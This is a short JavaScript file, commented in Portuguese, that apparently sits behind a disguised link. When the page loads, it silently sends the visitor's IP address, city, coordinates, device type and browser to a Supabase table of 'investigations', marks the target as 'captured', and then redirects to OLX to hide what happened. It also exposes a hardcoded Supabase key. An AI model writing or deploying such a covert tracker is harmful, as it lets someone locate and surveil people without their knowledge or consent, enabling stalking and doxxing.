// Conexão com o Supabase
const SUPABASE_URL = "https://dpfqhkjnirudtxuivhcg.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwZnFoa2puaXJ1ZHR4dWl2aGNnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTMwMDg1ODYsImV4cCI6MjA2ODU4NDU4Nn0.5NrF4nArELAGAkwjLOQNCdq-p1TLUIhZRN4XtZiJ7DI";

// Inicializa o cliente Supabase
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

document.addEventListener("DOMContentLoaded", async () => {
    try {
        // Coleta IP do visitante
        const ipRes = await fetch("https://ipwho.is/");
        const ipData = await ipRes.json();
        const ip = ipData.ip;
        const geolocalizacao = `${ipData.city} - ${ipData.region}`;
        const latitude = ipData.latitude?.toString() || "0.0000";
        const longitude = ipData.longitude?.toString() || "0.0000";
        const mapa_link = `https://maps.google.com/maps?q=${latitude},${longitude}&z=14&output=embed`;

        // Detecta tipo de aparelho
        const userAgent = navigator.userAgent;
        let aparelho = "Desconhecido";
        if (/Mobi|Android/i.test(userAgent)) {
            aparelho = "Celular";
        } else if (/iPad|Tablet/i.test(userAgent)) {
            aparelho = "Tablet";
        } else {
            aparelho = "Computador";
        }

        // Detecta navegador
        let navegador = "Desconhecido";
        if (/chrome/i.test(userAgent)) navegador = "Chrome";
        else if (/firefox/i.test(userAgent)) navegador = "Firefox";
        else if (/safari/i.test(userAgent)) navegador = "Safari";
        else if (/edge/i.test(userAgent)) navegador = "Edge";
        else if (/opera/i.test(userAgent)) navegador = "Opera";

        // Busca a investigação pendente mais recente
        const { data: investigacoes } = await supabaseClient
            .from("coleta_user_via_links")
            .select("*")
            .eq("status", "pendente")
            .order("data_hora", { ascending: false })
            .limit(1);

        // Se encontrou uma investigação pendente
        if (investigacoes && investigacoes.length > 0) {
            const investigacao = investigacoes[0];

            // Atualiza os dados da investigação
            await supabaseClient
                .from("coleta_user_via_links")
                .update({
                    ip: ip,
                    navegador: navegador,
                    geolocalizacao: geolocalizacao,
                    aparelho: aparelho,
                    data_hora: new Date().toISOString(),
                    latitude: latitude,
                    longitude: longitude,
                    mapa_link: mapa_link,
                    acessos: (investigacao.acessos || 0) + 1,
                    status: 'capturado'
                })
                .eq("id", investigacao.id);
        }

        // Sempre redireciona para OLX, independente de ter encontrado investigação ou não
        window.location.href = "https://www.olx.com.br";

    } catch (err) {
        console.log("Erro na captura, redirecionando...");
        window.location.href = "https://www.olx.com.br";
    }
});
